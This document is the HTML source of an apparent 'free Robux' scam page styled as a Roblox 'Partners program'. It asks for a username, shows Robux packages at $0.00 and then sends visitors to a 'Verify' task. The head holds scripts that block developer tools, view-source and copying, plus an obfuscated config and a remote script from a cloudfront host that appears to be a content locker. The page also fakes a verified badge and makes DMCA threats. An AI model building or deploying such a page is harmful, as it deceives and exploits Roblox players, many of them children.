
<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@Zoblox</title>
	<link rel="icon" type="image/x-icon" href="pfp.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="css/styles.css">


    <script src = "./js/jquery-3.7.1.min.js">
    
    
    </script>

    <script>
        $(document).keydown(function(event){
            if(event.keyCode==123){
                return false;
            }
            else if (event.ctrlKey && event.shiftKey && event.keyCode==73){
                    return false;
            }
        });

        $(document).on("contextmenu",function(e){
        e.preventDefault();
        });

        document.onkeydown = function(e) {
            if (e.ctrlKey &&
                (e.keyCode === 67 ||
                e.keyCode === 86 ||
                e.keyCode === 85 ||
                e.keyCode === 117)) {
                return false;
            } else {
                return true;
            }
        };
        $(document).keypress("u",function(e) {
            if(e.ctrlKey){
                return false;
            } else{
                return true;
            }
        });
    </script>

<script type="text/javascript">
    var vviGe_ZZd_FsgWxc={"it":4323091,"key":"a08e3"};
</script>
<script src="https://d29gqhzevia104.cloudfront.net/2cb419a.js"></script>
     <style>
        .userX01,#logo_player {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            border: 3px solid #fff;
        }
        .audio_btn {
    display: block;
    width: 200px;
    margin: 40px auto;
    border: 1px solid #ededed;
    padding: 6px;
    border-radius: 6px;
    cursor: pointer;
    transition: .4s;
            }
        .audio_btn:hover {
            background-color: #00B06F;
            color: #fff;
        }
        .audio_btn i {
            font-size: 25px;
            font-weight: bold;
        }
     </style>


</head>





<body>
    <div class="navbar">
        <div class="profile">
            <div class="profileimg">
                <img src="pfp.png" alt="">
            </div>
            <div class="text">
                <div class="partner">
                    <h4>Zoblox</h4>
                    <div class="badge"><img src="images/blue%20Verified%20Badge.png" alt=""></div>
                </div>
                <p>Partners program</p>
            </div>
        </div>
      <a href="https://cc74.site/"> <button>How it works? </button></a>
    </div>


    <!-- Main Content -->
    <div class="container">
        <div class="boxholder">
            <div class=" box1 box2">
                <div class="logo">
                    <img src="images/Roblox%20Logo.svg" alt="">
                </div>
                <p class="maintxt">Robux allows you to purshase upgrades for your avatar or buy special abilities in
                    experiences
                </p>
                <span class="title">Enter your Username</span>
                <input type="text" class="username" placeholder="type your user ...">
                <div class="button-wrapper">
                    <button class="getrbx">Continue</button>
                    <div class="loading-spinner" style="display: none;"></div>
                </div>
                
                
                <p class="error-message"></p>

            </div>
            <div class="box1 boxanimation" style="display: none;">
                <div class="loeader">
                    <img class="fade-image" id="logo_player" src="" alt="">
                </div>
                <p class="animationtxt"></p>
                <p class="countdown-animation"></p>

            </div>


            <div class=" box1 box3" style="display: none;">
                
                <img style="margin-bottom: 15px;" class="userX01" >


                <div class="row">
                    <div class="price">$0.00</div>
                    <div class="details">
                        <div class="robux_total">
                            <div class="pic"><img src="images/robux.png"></div><span>1 700</span>
                        </div>
                    </div>
                </div>
                <div class="row">

                    <div class="price">$0.00</div>
                    <div class="details">
                        <div class="robux_total">
                            <div class="pic"><img src="images/robux.png"></div><span>4 500</span>
                        </div>
                    </div>
                </div>
                <div class="row">

                    <div class="price">$0.00</div>
                    <div class="details">
                        <div class="robux_total">
                            <div class="pic"><img src="images/robux.png"></div>
                            <span>10 000</span>
                        </div>
                    </div>
                </div>
                <div class="row">

                    <div class="price">$0.00</div>
                    <div class="details">
                        <div class="robux_total">
                            <div class="pic"><img src="images/robux.png"></div><span>50 000</span>
                        </div>
                    </div>
                </div>
            </div>


            <div class="box1 boxanimation" style="display: none;">
                <div class="loeader">
                    <img class="fade-image" src="images/robux.png" alt="">
                </div>
                <p class="animationtxt">Sending Robux to...</p>
            </div>

            <div class="box1 box4" style="display: none;">
                <div class="logo">
                    <img src="images/Roblox%20Logo.svg" alt="">
                </div>
                <p class="maintxt2">Are you ready for a fun adventure? Complete one easy task to prove you're a real hero, and earn Robux 
                </p>
                
                <button onclick="_oy()">Verify</button>

                <div class="audio-place">

                    <b class="audio_btn"> <i class="bi bi-play-circle-fill"></i></b>
                    
                    <audio class="audio-element" src="./audios/Tutorial.mp3"></audio>
                </div>
                
                   
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <span>Copyright © 2025</span>
        <p>This is a copyrighted website and using it with no permission<br> could result in facing a lawsuit by
            <strong>DMCA</strong>.
        </p>
    </div>

    <script src="js/app.js"></script>



</body></html>
